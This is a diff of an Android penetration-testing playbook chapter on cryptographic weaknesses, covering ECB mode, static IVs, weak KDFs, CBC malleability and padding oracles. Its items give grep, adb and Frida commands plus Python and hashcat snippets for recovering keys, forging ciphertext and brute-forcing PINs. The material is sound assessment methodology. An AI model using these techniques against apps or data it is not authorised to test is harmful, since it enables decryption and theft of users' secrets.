-grep -rnE 'PBEKeySpec|SecretKeyFactory|PBKDF2|setIterationCount|\.getBytes\(\)|MessageDigest' out/sources/ -B6 -A6 \
+grep -rnE 'PBEKeySpec|SecretKeyFactory|PBKDF2|setIterationCount|\.getBytes\(\)|MessageDigest' $DEC/jadx/sources/ -B6 -A6 \
   | grep -nE 'ANDROID_ID|Settings\.Secure|Build\.SERIAL|getDeviceId|getImei|getPackageName|currentTimeMillis|firstInstallTime|"salt"'
-# read the identifier off the device and recompute
-adb shell settings get secure android_id
-adb shell getprop ro.serialno
+# read the identifier AS THE APP SEES IT, then recompute — since Android 8.0 ANDROID_ID is scoped per (signing key, user, device):
+# `adb shell settings get secure android_id` returns the SHELL's value, not the app's, and the recomputation fails for the wrong reason
+frida -D "$SERIAL" -q -t 20 -f com.target.app -e "Java.perform(function () { var ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(); console.log('[android_id as seen by the app] ' + Java.use('android.provider.Settings\$Secure').getString(ctx.getContentResolver(), 'android_id')); });"
+adb shell getprop ro.serialno    # only for Build.SERIAL derivations — which return 'unknown' on API 29+ without READ_PHONE_STATE: a key derived from the literal 'unknown' is a fleet-wide constant (D12-031)
 ```
 ```python
 import hashlib
@@ -634,6 +670,7 @@ print(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]))
 | **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5** — do not file it here); rate the consequence instead via `sensitive_data_exposure.disclosure_of_secrets.*` or `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-03/AM-04 with a read primitive; AM-01 if the key is identical across installs |
 | **Applies to** | `AndroidKeyStore` from API 18; `KeyGenParameterSpec` from API 23; StrongBox from API 28 |
+| **Requires** | — |
 | **Maps to** | MASWE-0003 (CWE-312/318/321), MASVS-CRYPTO-2, MASVS-STORAGE-1, LEGACY MSTG-CRYPTO-1/MSTG-STORAGE-1; MobSF NIAP `FCS_STO_EXT.1.1`, `FCS_CKM_EXT.1.1` |
 
 - **Test:** A correctly generated key written to `SharedPreferences`, a file or a DataStore is extractable.
@@ -641,10 +678,11 @@ print(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]))
   never direct file access".
 - **How:**
 ```bash
-grep -rn 'KeyStore\.getInstance("AndroidKeyStore")\|KeyGenParameterSpec\|KeyProtection\.Builder' out/sources/   # presence = good
-grep -rn 'edit()\.putString(' out/sources/ -B6 | grep -inE 'key|secret|iv|seed|salt|passphrase'
-adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' | grep -iE 'key|secret|iv|salt'
-adb shell run-as com.target.app sh -c 'ls -la files/ databases/ no_backup/'
+grep -rn 'KeyStore\.getInstance("AndroidKeyStore")\|KeyGenParameterSpec\|KeyProtection\.Builder' $DEC/jadx/sources/   # presence = good
+grep -rn 'edit()\.putString(' $DEC/jadx/sources/ -B6 | grep -inE 'key|secret|iv|seed|salt|passphrase'
+grep -rnE 'CleartextKeysetHandle|JsonKeysetReader|BinaryKeysetReader|AndroidKeysetManager|withMasterKey|withSharedPref' $DEC/jadx/sources/ -B2 -A4   # a Tink keyset without withMasterKey("android-keystore://…") is a plaintext keyset on disk
+adb shell "$AS 'cat /data/data/$PKG/shared_prefs/*.xml'" | grep -iE 'key|secret|iv|salt'   # outer double quotes survive the host; inner single quotes reach the device shell (AS: see the note under Items)
+adb shell "$AS 'ls -la /data/data/$PKG/files /data/data/$PKG/databases /data/data/$PKG/no_backup'"
 ```
 ```javascript
 Java.perform(function () {
@@ -669,24 +707,28 @@ Java.perform(function () {
 | **VRT** | `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3); escalate out of the branch via what you recover |
 | **Attacker** | AM-01 (ciphertext off the wire) / AM-03 (ciphertext off disk) |
 | **Applies to** | all |
-| **Maps to** | MASTG-TEST-0232 (static), MASTG-TEST-0350 (runtime), MASWE-0007, MASTG-BEST-0005, rule `mastg-android-broken-encryption-modes`, NIST SP 800-38A, NIST IR 8459; MobSF `android_aes_ecb` / `android_aws_ecb_default`; ASI campaign "Unsafe Encryption Mode" (2020-10-13, `faqs/answer/10046138`) |
+| **Requires** | — |
+| **Maps to** | MASTG-TEST-0232 (static), MASTG-TEST-0350 (runtime), MASTG-DEMO-0058 (ECB via `KeyGenParameterSpec`), MASWE-0007, MASTG-BEST-0005, rule `mastg-android-broken-encryption-modes`, NIST SP 800-38A, NIST IR 8459; MobSF `android_aes_ecb` / `android_aws_ecb_default`; ASI campaign "Unsafe Encryption Mode" (2020-10-13, `faqs/answer/10046138`) |
 
 - **Test:** `Cipher.getInstance("AES")` silently means **AES/ECB** because ECB is the JCA default — that is
   the form developers do not realise they wrote. Deterministic per-block encryption leaks plaintext
   structure and permits block reordering and cut-and-paste forgery.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-broken-encryption-modes.yaml out/sources/
-grep -rnE 'Cipher\.getInstance\(\s*"' out/sources/ | grep -iE '"AES"|ECB|NoPadding'
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-broken-encryption-modes.yaml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rnE 'Cipher\.getInstance\(\s*"' $DEC/jadx/sources/ | grep -iE '"AES"|ECB|NoPadding'
+grep -rnE 'BLOCK_MODE_ECB|setBlockModes\(' $DEC/jadx/sources/ -B4 -A4   # Keystore keys can be configured for ECB with no Cipher.getInstance("AES") literal (MASTG-DEMO-0058); the D12-004 table's blockModes column and the runtime [CIPHER] hook catch the transformation built from KeyProperties constants
 ```
   Runtime, which also catches transformations built by string concatenation — use the `[CIPHER]` hook from
   D12-002. Then demonstrate the structural leak on the app's own data:
 ```bash
 # feed the app two records whose plaintext shares a 16-byte block, then compare the stored ciphertext
-adb shell run-as com.target.app sqlite3 databases/app.db "select body from records" | while read r; do echo "$r" | base64 -d | xxd -c16; echo --; done
+adb exec-out "$AS 'cat /data/data/$PKG/databases/app.db'" > app.db   # exec-out for binary content; query on the HOST — the sqlite3 binary is absent on stock devices
+sqlite3 app.db 'select body from records' | while read -r r; do printf '%s' "$r" | base64 -d | xxd -c16; echo --; done
 ```
-- **Proof:** The transformation string from the trace **plus** two ciphertexts showing byte-identical
-  16-byte blocks where the plaintexts shared a block — or the classic ECB pattern on an encrypted image.
+- **Proof:** The transformation string from the trace (or a D12-004 row whose `blockModes` contains `ECB`) **plus** two
+  ciphertexts showing byte-identical 16-byte blocks where the plaintexts shared a block — or the classic ECB pattern on
+  an encrypted image.
 - **Escalation:** Block-swap forgery on an encrypted-but-unauthenticated message the server accepts →
   D15 authorisation bypass. MASTG-TEST-0350's "Further Validation Required" step is the triage gate:
   confirm the encrypted data is actually sensitive before rating above Medium.
@@ -702,14 +744,15 @@ adb shell run-as com.target.app sqlite3 databases/app.db "select body from recor
 | **VRT** | `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3) |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0221, MASWE-0007 (CWE-327), MASTG-BEST-0009, rule `mastg-android-broken-encryption-algorithms`; MobSF `android_weak_ciphers`, mobsfscan `weak_cipher`; NowSecure XTool AnyScan (CVE-2025-63432, CVE-2025-63433, CVE-2025-63434, CVE-2025-63435) |
 
 - **Test:** Inspect the algorithm string at `Cipher.getInstance`, `SecretKeyFactory.getInstance` and
   `KeyGenerator.getInstance`, then establish what the primitive protects.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-broken-encryption-algorithms.yaml out/sources/
-grep -rniE 'getInstance\(\s*"(DES|DESede|TripleDES|RC4|ARCFOUR|Blowfish|RC2)' out/sources/ -B6 -A6
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-broken-encryption-algorithms.yaml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rniE 'getInstance\(\s*"(DES|DESede|TripleDES|RC4|ARCFOUR|Blowfish|RC2)' $DEC/jadx/sources/ -B6 -A6
 ```
   The retirement facts to quote: **DES** 56-bit, withdrawn by NIST 2005 (FIPS 46-3); **3DES** 64-bit block,
   Sweet32, withdrawn 1 Jan 2024 (SP 800-67 r2); **RC4** predictable keystream, NIST-disapproved 2014,
@@ -739,16 +782,17 @@ print(DES.new(KEY, DES.MODE_ECB).decrypt(b64decode(open("meta.b64").read())))
 | **VRT** | `cryptographic_weakness.weak_hash.predictable_hash_collision` (varies — by impact); `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3) |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0008 (CWE-328), MASWE-0009 (CWE-354/807); MobSF `android_md5`, `android_sha1`, `android_weak_hash`; MobSF NIAP `FCS_COP.1.1(2)`, `FCS_COP.1.1(4)`; RFC 6151 |
 
 - **Test:** The finding is never "MD5 exists" — it is "MD5 decides a security outcome". Trace every digest
   to its consumer and keep only the ones that gate integrity, authentication or password storage.
 - **How:**
 ```bash
-grep -rniE 'MessageDigest\.getInstance\("(md5|md4|sha-?1)"\)|DigestUtils\.(md5|sha)\(|Hashing\.(md5|sha1)\(' out/sources/ -B6 -A6
+grep -rniE 'MessageDigest\.getInstance\("(md5|md4|sha-?1)"\)|DigestUtils\.(md5|sha)\(|Hashing\.(md5|sha1)\(' $DEC/jadx/sources/ -B6 -A6
 # then read the consumer: comparison? cache key? signature? password?
-grep -rn 'MessageDigest\.isEqual\|Arrays\.equals\|\.equals(' out/sources/ -B4 | grep -iE 'digest|hash|signature|checksum'
-grep -rniE 'Mac\.getInstance\("Hmac(MD5|SHA1)"\)|Signature\.getInstance\("(MD5|SHA1)with' out/sources/
+grep -rn 'MessageDigest\.isEqual\|Arrays\.equals\|\.equals(' $DEC/jadx/sources/ -B4 | grep -iE 'digest|hash|signature|checksum'
+grep -rniE 'Mac\.getInstance\("Hmac(MD5|SHA1)"\)|Signature\.getInstance\("(MD5|SHA1)with' $DEC/jadx/sources/
 ```
 - **Proof:** The digest feeding an integrity or authentication decision, and an input that passes the check
   which should not — a modified update file with a recomputed MD5, or a recovered password from an unsalted
@@ -767,6 +811,7 @@ grep -rniE 'Mac\.getInstance\("Hmac(MD5|SHA1)"\)|Signature\.getInstance\("(MD5|S
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies — CWE-325); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) if the flipped field is an identifier the server honours |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0007, MASWE-0009; mobsfscan `cbc_static_iv`, `cbc_padding_oracle` |
 
 - **Test:** Unauthenticated CBC is malleable. If the app or its API decrypts a blob and then trusts a field
@@ -775,8 +820,8 @@ grep -rniE 'Mac\.getInstance\("Hmac(MD5|SHA1)"\)|Signature\.getInstance\("(MD5|S
   free.
 - **How:**
 ```bash
-grep -rnE 'Cipher\.getInstance\("[^"]*CBC[^"]*"\)' out/sources/
-grep -rn 'Mac\.getInstance\|GCMParameterSpec\|HmacSHA256\|\.doFinal' out/sources/ | grep -ci 'mac'   # absence is the tell
+grep -rnE 'Cipher\.getInstance\("[^"]*CBC[^"]*"\)' $DEC/jadx/sources/
+grep -rn 'Mac\.getInstance\|GCMParameterSpec\|HmacSHA256\|\.doFinal' $DEC/jadx/sources/ | grep -ci 'mac'   # absence is the tell
 ```
 ```python
 # flip a byte in ciphertext block n to change the corresponding byte of plaintext block n+1
@@ -803,6 +848,7 @@ open("ct_flipped.bin","wb").write(ct)
 | **VRT** | `cryptographic_weakness.side_channel_attack.padding_oracle_attack` (**P4** — the crypto-native cap); exit via `broken_authentication_and_session_management.authentication_bypass` (P1) if you decrypt or forge an identity blob |
 | **Attacker** | AM-01 |
 | **Applies to** | all; the static tell is CBC/PKCS5 with no `Mac`/`GCM` anywhere nearby |
+| **Requires** | backend-api, mitm |
 | **Maps to** | MASWE-0007; mobsfscan `cbc_padding_oracle`, `cbc_kotlin_padding_oracle`; MobSF `cbc_padding_oracle` (CWE-649) |
 
 - **Test:** Where the app or its API decrypts attacker-supplied ciphertext and distinguishes a padding
@@ -810,7 +856,7 @@ open("ct_flipped.bin","wb").write(ct)
   key.
 - **How:**
 ```bash
-grep -rnE 'CBC/PKCS(5|7)Padding|BadPaddingException|IllegalBlockSizeException' out/sources/ -B6 -A6
+grep -rnE 'CBC/PKCS(5|7)Padding|BadPaddingException|IllegalBlockSizeException' $DEC/jadx/sources/ -B6 -A6
 ```
 ```bash
 # n>=10 interleaved trials per group, randomised order — never a single shot
@@ -851,14 +897,15 @@ PY
 | **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_initialization_vector` (P4, CWE-340) |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0007; mobsfscan `cbc_static_iv`; MobSF `android_weak_iv` (CWE-329; patterns `0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00` and `0x01,0x02,0x03,0x04,0x05,0x06,0x07`) |
 
 - **Test:** `IvParameterSpec(new byte[16])`, an IV derived from the key, an IV hardcoded as a string, or the
   same IV across encryptions destroys semantic security and enables first-block manipulation.
 - **How:**
 ```bash
-grep -rn 'IvParameterSpec' out/sources/ -B6 -A2 | grep -inE 'new byte\[|"[0-9A-Fa-f]{16,}"|getBytes\(\)|0x00, *0x00'
-grep -rn 'setRandomizedEncryptionRequired' out/sources/     # false on a Keystore key = caller supplies the IV
+grep -rn 'IvParameterSpec' $DEC/jadx/sources/ -B6 -A2 | grep -inE 'new byte\[|"[0-9A-Fa-f]{16,}"|getBytes\(\)|0x00, *0x00'
+grep -rn 'setRandomizedEncryptionRequired' $DEC/jadx/sources/     # false on a Keystore key = caller supplies the IV
 ```
   Use the `[IV]` hook from D12-002 and encrypt the same plaintext twice across separate app runs.
 - **Proof:** The same IV hex printed across separate encryptions, or byte-identical ciphertexts for
@@ -878,6 +925,7 @@ grep -rn 'setRandomizedEncryptionRequired' out/sources/     # false on a Keystor
 | **VRT** | `cryptographic_weakness.insufficient_entropy.initialization_vector_reuse` (**P5** on its own); rate the recovered plaintext or the forgery instead |
 | **Attacker** | AM-01 |
 | **Applies to** | all; the Android guidance is explicit — "Avoid IV/counter reuse in CTR mode. Ensure that they're cryptographically random" |
+| **Requires** | — |
 | **Maps to** | MASWE-0007, CWE-1204; `privacy-and-security/security-tips` (Cryptography) |
 
 - **Test:** CTR nonce reuse under one key XORs two plaintexts together; GCM nonce reuse under one key leaks
@@ -885,8 +933,8 @@ grep -rn 'setRandomizedEncryptionRequired' out/sources/     # false on a Keystor
   than CBC IV reuse and must not be filed as the same item.
 - **How:**
 ```bash
-grep -rnE 'Cipher\.getInstance\("[^"]*(CTR|GCM)[^"]*"\)' out/sources/ -B8 -A4
-grep -rn 'GCMParameterSpec' out/sources/ -B6 -A2
+grep -rnE 'Cipher\.getInstance\("[^"]*(CTR|GCM)[^"]*"\)' $DEC/jadx/sources/ -B8 -A4
+grep -rn 'GCMParameterSpec' $DEC/jadx/sources/ -B6 -A2
 ```
   Collect a corpus of ciphertexts and look for repeated nonces:
 ```python
@@ -914,6 +962,7 @@ print([ (n.hex(), c) for n, c in nonces.most_common(10) if c > 1 ])
 | **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (varies); `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4) |
 | **Attacker** | AM-01 |
 | **Applies to** | **Android 12 (API 31)+** — BouncyCastle removed in favour of Conscrypt |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/about/versions/12/behavior-changes-all` — BouncyCastle removed, 512-bit AES unsupported, invalid `KeyGenerator` key sizes rejected, "GCM ciphers initialized with non-12-byte sizes" rejected; `risks/broken-cryptographic-algorithm` |
 
 - **Test:** Android 12 started rejecting three specific things. Apps that hit these commonly added
@@ -921,17 +970,20 @@ print([ (n.hex(), c) for n, c in nonces.most_common(10) if c > 1 ])
   parameters the platform refused. That deliberate routing-around is the finding.
 - **How:**
 ```bash
-grep -rn 'Security\.insertProviderAt\|Security\.addProvider\|BouncyCastleProvider\|getInstance\([^)]*,\s*"BC"' out/sources/
-grep -rn 'GCMParameterSpec\|IvParameterSpec' out/sources/ -A2 | grep -nE 'new byte\[(8|16)\]'
-grep -rnE '\.init\(\s*512\s*\)|setKeySize\(\s*512\s*\)' out/sources/
-unzip -l base.apk | grep -i 'bcprov\|bcpkix\|spongycastle'
+# provider re-registration and the bundled-BC census are measured ONCE in D12-070 (owner for the bundled-provider finding across chapters: D22-017); this item adds only the parameter greps
+grep -rn 'GCMParameterSpec\|IvParameterSpec' $DEC/jadx/sources/ -A2 | grep -nE 'new byte\[(8|16)\]'
+grep -rnE 'new GCMParameterSpec\(\s*(32|64|96|104|112)\s*,' $DEC/jadx/sources/   # tag < 128 bits; < 96 is forgeable in practice (NIST SP 800-38D App. C) — the D12-002 hook prints tagBits for every init
+grep -rnE '\.init\(\s*512\s*\)|setKeySize\(\s*512\s*\)' $DEC/jadx/sources/
 ```
 - **Proof:** A bundled BC provider inserted at priority 1 **and** a GCM init with a 16-byte IV (or a
   512-bit AES key), i.e. the app restoring a configuration the platform deliberately rejects — with the
-  bundled `bcprov` version recorded so the library CVE exposure can be argued alongside.
-- **Escalation:** → D12-020 (nonce-misuse-prone GCM), D12-072 (vulnerable bundled library), D17
-  (supply chain).
-- **Ruled out when:** No provider is registered by the app, every `GCMParameterSpec` IV is 12 bytes, and no
+  bundled `bcprov` version recorded so the library CVE exposure can be argued alongside (the provider half comes
+  from D12-070's log); a `[GCM] tagBits=` line below 96 from the D12-002 hook on data the server or app
+  authenticates is the tag-truncation half.
+- **Escalation:** → D12-020 (nonce-misuse-prone GCM), D12-070 (the provider finding, filed once), D12-072 (vulnerable
+  bundled library), D17 (supply chain).
+- **Ruled out when:** No provider is registered by the app (D12-070), every `GCMParameterSpec` IV is 12 bytes with a
+  128-bit tag (or >= 96 with a bounded number of verification attempts the app enforces), and no
   `KeyGenerator` size outside the platform-accepted set appears. If the app targets < API 31 the platform
   check never fires — say so and rate on the parameter itself, not on the bypass.
 
@@ -943,14 +995,15 @@ unzip -l base.apk | grep -i 'bcprov\|bcpkix\|spongycastle'
 | **VRT** | `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3); `cryptographic_weakness.side_channel_attack.padding_oracle_attack` (P4) if you build a Bleichenbacher oracle |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | backend-api, mitm |
 | **Maps to** | MASWE-0007; MobSF `android_rsa_no_oaep` (CWE-780, masvs `crypto-3`); mobsfscan `rsa_no_oeap`; QARK `rsa_cipher_usage.py` |
 
 - **Test:** `RSA/ECB/NoPadding` is malleable outright; `RSA/ECB/PKCS1Padding` for *encryption* is
   Bleichenbacher-vulnerable wherever the counterpart distinguishes malformed ciphertexts.
 - **How:**
 ```bash
-grep -rniE 'Cipher\.getInstance\("rsa/[^"]*/(no|pkcs1)padding"' out/sources/ -B6 -A6
-grep -rn 'Cipher\.getInstance\("RSA' out/sources/ | grep -vi oaep
+grep -rniE 'Cipher\.getInstance\("rsa/[^"]*/(no|pkcs1)padding"' $DEC/jadx/sources/ -B6 -A6
+grep -rn 'Cipher\.getInstance\("RSA' $DEC/jadx/sources/ | grep -vi oaep
 ```
   Then probe the decrypting side with malformed ciphertexts using the same interleaved-trial harness as
   D12-018.
@@ -970,15 +1023,16 @@ grep -rn 'Cipher\.getInstance\("RSA' out/sources/ | grep -vi oaep
 | **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (varies); rate on the recovered secret |
 | **Attacker** | AM-01 |
 | **Applies to** | all — very high hit rate in obfuscation, licensing and "secure config" code |
+| **Requires** | — |
 | **Maps to** | mobsfscan `android_custom_xor_crypto` / `android_kotlin_custom_xor_crypto` ("A cryptography-named method uses XOR directly"); MASWE-0047 (Using Non-Standard APIs for Security-Critical Functionality); LEGACY MSTG-CRYPTO-2 |
 
 - **Test:** A method whose *name* implies cryptography and whose *body* is a XOR loop. Rarely checked,
   frequently present.
 - **How:**
 ```bash
-grep -rniE '(encrypt|decrypt|cipher|crypt|obfusc|scramble|protect)' out/sources/ -A20 | grep -nE '\^|xor' | head -60
+grep -rniE '(encrypt|decrypt|cipher|crypt|obfusc|scramble|protect)' $DEC/jadx/sources/ -A20 | grep -nE '\^|xor' | head -60
 # smali is often clearer for the loop shape
-grep -rn 'xor-int\|xor-long\|xor-int/lit8' out/smali/ -B12 | grep -inE 'encrypt|decrypt|key'
+grep -rn 'xor-int\|xor-long\|xor-int/lit8' $DEC/apktool/smali*/ -B12 | grep -inE 'encrypt|decrypt|key'
 ```
 - **Proof:** Recover the key by XORing a known plaintext against its stored ciphertext, then decrypt a
   second, previously unknown blob with the same key and show the plaintext. Two blobs is the proof; one is
@@ -996,6 +1050,7 @@ grep -rn 'xor-int\|xor-long\|xor-int/lit8' out/smali/ -B12 | grep -inE 'encrypt|
 | **VRT** | rate as the underlying exposure: `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) on disk, or `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) once you control the parameter |
 | **Attacker** | AM-01 / AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | sec-88 InsecureBankv2 (`Base64.decode(username, 0)` in `MyBroadCastReceiver` while only the password used AES); Voorivex/MyIrancell stage 3 (login phone number appeared as `4n5lcipUYfhzJ3QeTUVz`) |
 
 - **Test:** Two related shapes. First, values that look encrypted but are only encoded. Second — the higher
@@ -1003,8 +1058,8 @@ grep -rn 'xor-int\|xor-long\|xor-int/lit8' out/smali/ -B12 | grep -inE 'encrypt|
   control once you write the codec.
 - **How:**
 ```bash
-grep -rn 'Base64\.encodeToString\|Base64\.decode\|android\.util\.Base64' out/sources/ | grep -iE 'password|token|pin|secret|user|phone'
-adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' \
+grep -rn 'Base64\.encodeToString\|Base64\.decode\|android\.util\.Base64' $DEC/jadx/sources/ | grep -iE 'password|token|pin|secret|user|phone'
+adb shell "$AS 'cat /data/data/$PKG/shared_prefs/*.xml'" \
   | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | while read v; do echo "$v" | base64 -d 2>/dev/null; echo; done
 ```
   For the custom transform: capture the same plaintext encoded twice — identical output means no IV or
@@ -1025,15 +1080,16 @@ adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' \
 | **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_space` (P3, CWE-326/331/522) |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0208, MASWE-0013, MASTG-KNOW-0012, rule `mastg-android-key-generation-with-insufficient-key-length`; mobsfscan `weak_key_size`; MobSF NIAP `FCS_CKM.1.1(1)`, `FCS_CKM.1.1(2)` |
 
 - **Test:** Read the size argument to `KeyGenerator.init(int)`, `KeyPairGenerator.initialize(int)` and
   `KeyGenParameterSpec.Builder.setKeySize(int)`.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-key-generation-with-insufficient-key-length.yml out/sources/
-grep -rnE 'KeyGenerator\.getInstance|KeyPairGenerator\.getInstance' out/sources/ -A6 | grep -E '\.init\(|\.initialize\('
-grep -rnE '\.(init|initialize|setKeySize)\(\s*(64|128|512|768|1024)\s*\)' out/sources/
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-key-generation-with-insufficient-key-length.yml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rnE 'KeyGenerator\.getInstance|KeyPairGenerator\.getInstance' $DEC/jadx/sources/ -A6 | grep -E '\.init\(|\.initialize\('
+grep -rnE '\.(init|initialize|setKeySize)\(\s*(64|128|512|768|1024)\s*\)' $DEC/jadx/sources/
 ```
 - **Proof:** The call site and the numeric size — e.g. `KeyPairGenerator.initialize(1024)` for RSA, EC below
   224, or a 64-bit symmetric key.
@@ -1052,6 +1108,7 @@ grep -rnE '\.(init|initialize|setKeySize)\(\s*(64|128|512|768|1024)\s*\)' out/so
 | **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies — rate on the recovered plaintext) |
 | **Attacker** | AM-01 with a pulled blob / AM-03 with a read primitive |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0014 (CWE-326/327/759/760/916), MASWE-0008, NIST SP 800-132, OWASP Password Storage Cheat Sheet. **No Android MASTG-TEST covers KDF misuse — cite this as a MASTG gap rather than inventing a test id** |
 
 - **Test:** Keys derived from passwords or PINs must use PBKDF2, scrypt or Argon2 with a per-user random
@@ -1059,9 +1116,9 @@ grep -rnE '\.(init|initialize|setKeySize)\(\s*(64|128|512|768|1024)\s*\)' out/so
   `PBEKeySpec(pw, salt, 1000, 256)`.
 - **How:**
 ```bash
-grep -rn 'new PBEKeySpec(' out/sources/ -B4 -A4        # read the iteration count and the salt argument
-grep -rn 'SecretKeyFactory\.getInstance("PBKDF2\|PBEWITH\|scrypt\|Argon2\|bcrypt' out/sources/
-grep -rn 'MessageDigest\.getInstance\("SHA-256"\)' out/sources/ -B8 -A8 | grep -inE 'password|passphrase|pin|key ='
+grep -rn 'new PBEKeySpec(' $DEC/jadx/sources/ -B4 -A4        # read the iteration count and the salt argument
+grep -rn 'SecretKeyFactory\.getInstance("PBKDF2\|PBEWITH\|scrypt\|Argon2\|bcrypt' $DEC/jadx/sources/
+grep -rn 'MessageDigest\.getInstance\("SHA-256"\)' $DEC/jadx/sources/ -B8 -A8 | grep -inE 'password|passphrase|pin|key ='
 ```
   Then quantify the offline attack at realistic rates:
 ```bash
@@ -1083,14 +1140,15 @@ hashcat -a 0 -m 10900 pbkdf2sha256.hash rockyou.txt
 | **VRT** | `cryptographic_weakness.weak_hash.lack_of_salt` (varies); `cryptographic_weakness.weak_hash.use_of_predictable_salt` (**P5**) |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0014 (CWE-759 missing salt, CWE-760 predictable salt) |
 
 - **Test:** A salt that is a constant byte array, an empty array, the username, or reused across users
   makes one precomputation break every user.
 - **How:**
 ```bash
-grep -rn 'PBEKeySpec(\|SecretKeyFactory\|MessageDigest' out/sources/ -B6 -A6 | grep -inE 'salt|getBytes\(\)|new byte\[\] *\{'
-grep -rn 'generateSeed\|SecureRandom' out/sources/ -A4 | grep -in salt    # the correct construction, to confirm ABSENT
+grep -rn 'PBEKeySpec(\|SecretKeyFactory\|MessageDigest' $DEC/jadx/sources/ -B6 -A6 | grep -inE 'salt|getBytes\(\)|new byte\[\] *\{'
+grep -rn 'generateSeed\|SecureRandom' $DEC/jadx/sources/ -A4 | grep -in salt    # the correct construction, to confirm ABSENT
 # two clean installs: is the stored salt identical?
 for s in emulator-5554 emulator-5556; do adb -s $s shell run-as com.target.app cat shared_prefs/crypto.xml; done
 ```
@@ -1109,6 +1167,7 @@ for s in emulator-5554 emulator-5556; do adb -s $s shell run-as com.target.app c
 | **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) if the vault holds the session |
 | **Attacker** | AM-01 with a pulled vault / AM-03 with a read primitive |
 | **Applies to** | all apps with a PIN-protected local vault |
+| **Requires** | — |
 | **Maps to** | MASWE-0014 — "for low-entropy inputs the required mitigation is to combine the derived key with keystore-held secret material" |
 
 - **Test:** No KDF work factor saves a 4-digit PIN from an offline attack: 10,000 candidates is trivially
@@ -1116,9 +1175,9 @@ for s in emulator-5554 emulator-5556; do adb -s $s shell run-as com.target.app c
   a non-exportable Keystore secret, so the attack must run on-device against a rate-limited key.
 - **How:**
 ```bash
-grep -rn 'PBEKeySpec\|Argon2\|scrypt' out/sources/ -B10 -A10 | grep -inE 'pin|passcode|4.digit|6.digit'
+grep -rn 'PBEKeySpec\|Argon2\|scrypt' $DEC/jadx/sources/ -B10 -A10 | grep -inE 'pin|passcode|4.digit|6.digit'
 # is a Keystore key mixed in at all?
-grep -rn 'AndroidKeyStore\|KeyGenParameterSpec\|Mac\.getInstance\("HmacSHA256"\)' out/sources/ -B10 | grep -in 'pin\|derive'
+grep -rn 'AndroidKeyStore\|KeyGenParameterSpec\|Mac\.getInstance\("HmacSHA256"\)' $DEC/jadx/sources/ -B10 | grep -in 'pin\|derive'
 ```
 ```python
 import hashlib, itertools
@@ -1146,19 +1205,22 @@ for pin in ("%04d" % i for i in range(10000)):
 | **VRT** | `cryptographic_weakness.key_reuse.intra_environment` (**P5** on its own — you must demonstrate the cross-protocol use to exceed it) |
 | **Attacker** | AM-03 / AM-08 |
 | **Applies to** | `KeyGenParameterSpec` is API 23+ |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0307 (static), MASTG-TEST-0308 (runtime), MASWE-0007 (CWE-323), MASTG-KNOW-0012, NIST SP 800-57 Pt1 Rev5 §5.2, rule `mastg-android-asymmetric-key-pair-used-for-multiple-purposes` |
 
 - **Test:** NIST requires one purpose per key. On Android the purposes are a bitmask, and the decompile
   shows the **combined integer** — decode it before concluding anything.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-asymmetric-key-pair-used-for-multiple-purposes.yml out/sources/
-grep -rn 'KeyGenParameterSpec\.Builder(' out/sources/ -A6
